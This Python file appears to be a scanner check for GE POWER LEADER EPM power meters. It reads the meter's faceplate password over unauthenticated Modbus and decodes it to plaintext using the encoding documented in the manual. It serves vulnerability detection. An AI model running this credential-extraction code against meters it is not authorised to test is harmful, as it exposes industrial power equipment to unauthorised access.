"""Native check — GE POWER LEADER EPM (Electronic Power Meter, register map "PLEPM"), reachable via
a GE POWER LEADER Modbus Concentrator: the meter's 6-digit LOCAL FACEPLATE PASSWORD is disclosed as a
plain, READ-ONLY Modbus holding-register value, decodable with a documented reversible scheme — an
unauthenticated credential disclosure (CWE-200).

Sourced directly from GE publication GEH-6508B, "POWER LEADER Modbus Concentrator Protocol
Reference", read via pdftotext (not search-summarized). Three facts, each verified against the
manual's own text/worked-example rather than assumed (the Beckwith M-3425A build showed how easy the
register-addressing conversion is to get wrong):

1. REGISTER 3029 = "Local faceplate password" ONLY in the PLEPM table. The same register number means
   entirely different things in the other POWER LEADER device tables in this manual (Current Unbalance
   Setpoint, Ground TOC Pickup, Commnet address, ...). So this check must confirm it is really talking
   to a PLEPM before trusting register 3029 — done here by reading the PLEPM Product ID register.

2. PRODUCT ID: PLEPM register 0000 ("Product Id") is documented as "Always 0Eh". This is the live
   on-the-wire discriminator this check uses to avoid misreading 3029 on some other device.

3. ADDRESSING + ENCODING, both from the manual verbatim:
   - The manual's worked example ("registers 3010-3012 from a device at address 100: 64h 03h 0Bh C2h
     00h 03h") shows the Modbus start-address field = the register number itself (3010 -> 0x0BC2), so
     register 3029 is requested as start address 0x0BD5 directly — NO register#-1 subtraction (unlike
     Beckwith's map).
   - The password is 6 digits, ONE BYTE per digit (not a nibble): byte = 0xD5 - digit, i.e.
     0->D5h, 1->D4h, ... 9->CCh. The manual's worked example "12-34-56 would be encoded as
     D4D3D2D1D0CFh" is exactly D4 D3 D2 D1 D0 CF = 6 bytes = 3 Modbus registers (3029,3030,3031),
     high-byte-then-low-byte per register per the manual's FC03 response description. Decoding each
     byte (digit = 0xD5 - byte) directly YIELDS the working faceplate password.

SAFE / READ-ONLY (destructive: false): exactly two Modbus FC03 reads (Product Id, then the password
registers), no write of any kind. confidence: low — addressing + encoding are manual-verified, but
there is no live PLEPM in this project to confirm against, and reaching a specific meter behind a
concentrator depends on the operator targeting the right Modbus unit id (params.unit_id). A CONFIRMED
means the Product Id read == 0x0E AND all six password bytes decode to valid digits, i.e. a real
PLEPM disclosed a decodable faceplate password with no credential supplied. disclosure_status: public
(documented device behavior / GEH-6508B is a public manual).

fingerprint_precondition is a lightweight modbus_identity (confirms a real Modbus stack); the PLEPM
Product Id read above is the actual model gate, done live inside this check.
"""

from __future__ import annotations

import socket
import struct
from typing import Optional

from core.check import Check, CheckResult, CheckStatus
from core.target import Target

_FC_READ_HOLDING = 0x03
_PLEPM_PRODUCT_ID_ADDR = 0x0000     # PLEPM register 0000 "Product Id" (== 0x0E)
_PLEPM_PRODUCT_ID_VALUE = 0x0E
_FACEPLATE_PW_ADDR = 0x0BD5         # register 3029, requested as start address 3029 (manual's convention)
_FACEPLATE_PW_REG_COUNT = 3         # 3 registers = 6 bytes = 6 password digits


def _mbap(pdu: bytes, unit_id: int, tid: int = 0x0001) -> bytes:
    return struct.pack(">HHHB", tid, 0x0000, 1 + len(pdu), unit_id) + pdu


def _decode_faceplate_password(data: bytes) -> Optional[str]:
    """Decode the 6 encoded password bytes (one per digit, byte = 0xD5 - digit, valid 0xCC..0xD5).
    Returns the 6-digit password string, or None if any byte is outside the documented range."""
    if len(data) != 6:
        return None
    digits = []
    for b in data:
        digit = 0xD5 - b
        if digit < 0 or digit > 9:
            return None
        digits.append(str(digit))
    return "".join(digits)


def _read_holding(sock: socket.socket, addr: int, count: int, unit_id: int, tid: int) -> Optional[bytes]:
    """One FC03 read; returns the register DATA bytes (2*count) on a well-formed reply, else None
    (Modbus exception reply, wrong function, short frame)."""
    pdu = struct.pack(">BHH", _FC_READ_HOLDING, addr, count)
    sock.sendall(_mbap(pdu, unit_id, tid))
    resp = sock.recv(256)
    expected_bytes = 2 * count
    if len(resp) >= 9 + expected_bytes and resp[7] == _FC_READ_HOLDING and resp[8] == expected_bytes:
        return resp[9:9 + expected_bytes]
    return None


class GePowerLeaderEpmFaceplatePasswordDisclosureCheck(Check):
    def probe(self, target: Target, rate_limiter=None) -> CheckResult:
        if target.port is None:
            return self._result(target, CheckStatus.ERROR, description="target has no port configured")
        params = self.metadata.params or {}
        unit_id = params.get("unit_id", 0xFF)
        verify_product_id = params.get("verify_product_id", True)
        timeout = params.get("timeout", 5.0)

        if rate_limiter is not None:
            rate_limiter.acquire(target.host)

        sock: Optional[socket.socket] = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target.host, target.port))

            if verify_product_id:
                pid = _read_holding(sock, _PLEPM_PRODUCT_ID_ADDR, 1, unit_id, tid=0x0001)
                if pid is None:
                    return self._result(target, CheckStatus.NOT_APPLICABLE,
                                        description="no well-formed FC03 reply reading PLEPM Product Id (reg 0) — not a POWER LEADER EPM behind a Modbus Concentrator, or wrong unit id")
                if struct.unpack(">H", pid)[0] != _PLEPM_PRODUCT_ID_VALUE:
                    return self._result(target, CheckStatus.NOT_APPLICABLE,
                                        description=f"Product Id register (reg 0) = 0x{struct.unpack('>H', pid)[0]:04X}, not the PLEPM value 0x000E — this is some other device; register 3029 is not a faceplate password here",
                                        evidence=pid)

            pw_bytes = _read_holding(sock, _FACEPLATE_PW_ADDR, _FACEPLATE_PW_REG_COUNT, unit_id, tid=0x0002)
        except socket.timeout:
            return self._result(target, CheckStatus.ERROR, description="no response to the faceplate-password register read within timeout")
        except OSError as e:
            return self._result(target, CheckStatus.ERROR, description=f"connection error: {e}")
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass

        if pw_bytes is None:
            return self._result(target, CheckStatus.NOT_APPLICABLE,
                                description="no well-formed FC03 reply reading the faceplate-password registers (3029-3031)")

        password = _decode_faceplate_password(pw_bytes)
        if password is None:
            return self._result(target, CheckStatus.NOT_APPLICABLE,
                                description=f"registers 3029-3031 did not decode to a valid 6-digit faceplate password (bytes {pw_bytes.hex()}) — not a disclosing PLEPM",
                                evidence=pw_bytes)

        return self._result(target, CheckStatus.CONFIRMED,
                            description=("GE POWER LEADER EPM disclosed its local faceplate password via an "
                                        "unauthenticated Modbus read of registers 3029-3031 (CWE-200): decoded "
                                        "6-digit password recovered from the documented 0xD5-digit encoding. No "
                                        "credential was supplied to obtain it."),
                            evidence=pw_bytes)

    def _result(self, target: Target, status: CheckStatus, description: str = "", evidence: Optional[bytes] = None) -> CheckResult:
        return CheckResult(
            check_id=self.metadata.check_id,
            protocol=self.metadata.protocol,
            target=str(target),
            status=status,
            confidence=self.metadata.confidence,
            cve_id=self.metadata.cve_id,
            can_id=self.metadata.can_id,
            severity=self.metadata.severity,
            description=description,
            evidence=evidence,
        )


CHECK_CLASS = GePowerLeaderEpmFaceplatePasswordDisclosureCheck
